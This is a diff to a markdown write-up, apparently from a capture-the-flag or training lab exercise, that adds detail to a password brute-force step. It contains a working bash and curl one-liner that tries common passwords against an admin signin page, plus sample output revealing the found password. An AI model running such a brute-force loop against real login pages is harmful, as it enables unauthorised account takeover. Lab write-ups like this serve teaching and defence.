@@ -50,9 +50,14 @@ Of course the password can be retrieved with sending a query to the `Member_Brut
 
 
 ```
-cat 2020-200_most_used_passwords.txt| while read password; do flag=$(curl -L "http://192.168.1.17:4242/?page=signin&username=admin&password=${password}&Login=Login" 2>/dev/null |  grep "flag" | wc -l); if [[ "${flag}" -eq 1 ]]; then echo "Success: The password is ${password}";break 2; fi; done
+$ cat 2020-200_most_used_passwords.txt| while read password; do flag=$(curl -L "http://{IP_ADDR}/?page=signin&username=admin&password=${password}&Login=Login" 2>/dev/null |  grep "flag" | wc -l); if [[ "${flag}" -eq 1 ]]; then echo "Success: The password is ${password}";break 2; fi; done
+
+# if the password exists, the script will print out the password.
+Success: The password is shadow
+
 ```
 
+Loggin in with ID and password found, `id: admin, pw: shadow`, the token will be present.
 
 ## Remediation
 
